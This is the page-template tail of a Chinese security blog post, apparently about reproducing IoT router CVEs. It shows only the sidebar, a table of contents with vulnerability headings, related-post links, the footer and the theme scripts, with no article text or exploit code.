data-lazy-src="/img/touxiang.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-name">ixout</div></label></div><div class="author-switch-content"><input class="switch-content" type="radio" name="switch-content" value="description"/><label class="author-description-box">      <div class="author-description"><font color="#e66b6d">十八线业余选手</font></div></label><input class="switch-content" type="radio" name="switch-content" value="social" checked="checked"/><label class="author-social-box"><a class="card-author-button" target="_blank" rel="noopener" href="https://github.com/ixout"><i class="iconfont icon-github"></i><span>Follow Me With Github</span></a><div class="social-icons"><a class="social-icon" href="https://github.com/ixout" target="_blank" title="Github"><i class="fa-brands fa-github"></i></a><a class="social-icon" href="/1425430423" target="_blank" title="QQ"><i class="fa-brands fa-qq"></i></a></div></label><input class="switch-content" type="radio" name="switch-content" value="site-data"/><label class="author-data-box"><div class="site-data"><a class="data-item" href="/archives/"><div class="data-name">文章</div><div class="data-length">58</div></a><a class="data-item" href="/tags/"><div class="data-name">标签</div><div class="data-length">64</div></a><a class="data-item" href="/categories/"><div class="data-name">分类</div><div class="data-length">5</div></a></div></label></div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>告示牌</span></div><div class="announcement_content"><font color="＃00CED1">(º﹃º)阿巴阿巴阿巴......</font></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CVE-2017-17215"><span class="toc-number">1.</span> <span class="toc-text">CVE-2017-17215</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BF%E7%9C%9F"><span class="toc-number">1.1.</span> <span class="toc-text">仿真</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞复现</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CVE-2018-5767"><span class="toc-number">2.</span> <span class="toc-text">CVE-2018-5767</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.2.</span> <span class="toc-text">复现</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CVE-2018-7034"><span class="toc-number">3.</span> <span class="toc-text">CVE-2018-7034</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91"><span class="toc-number">3.1.</span> <span class="toc-text">二进制逆向</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0-1"><span class="toc-number">3.2.</span> <span class="toc-text">复现</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#TP-Link-SR20-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.</span> <span class="toc-text">TP-Link SR20 命令执行漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="toc-number">4.1.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0-2"><span class="toc-number">4.2.</span> <span class="toc-text">复现</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DIR-815%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA"><span class="toc-number">5.</span> <span class="toc-text">DIR-815缓冲区溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%A4%8D%E7%8E%B0"><span class="toc-number">5.1.</span> <span class="toc-text">环境复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-2"><span class="toc-number">5.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">5.3.</span> <span class="toc-text">漏洞利用</span></a></li></ol></li></ol></div></div><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/2980/" title="几道iotpwn题目复现"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/676eab85f89e48508a.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-05-12</div><div class="title">几道iotpwn题目复现</div></div></a></div><div><a href="/posts/15971/" title="还原魔改luac"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/p45347545154796.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-27</div><div class="title">还原魔改luac</div></div></a></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By ixout</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><a class="icon-V hidden" onclick="switchNightMode()" title="浅色和深色模式转换"><svg width="25" height="25" viewBox="0 0 1024 1024"><use id="modeicon" xlink:href="#icon-moon"></use></svg></a><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button><button id="go-down" type="button" title="直达底部" onclick="btf.scrollToDest(document.body.scrollHeight, 500)"><i class="fas fa-arrow-down"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"></div><canvas id="universe"></canvas><script defer src="/js/universe.js"></script><script defer src="/js/cursor.js"></script><script async src="/js/fps.js"></script><script async src="/js/title.js"></script><script src="/js/sun_moon.js" async></script><script async src="//at.alicdn.com/t/c/font_3930344_38rvofbfw64.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="true"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="富强,民主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="20px" data-random="false" async="async"></script></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div><!-- hexo injector body_end start --><script async src="//at.alicdn.com/t/font_2032782_8d5kxvn09md.js"></script><!-- hexo injector body_end end --></body></html>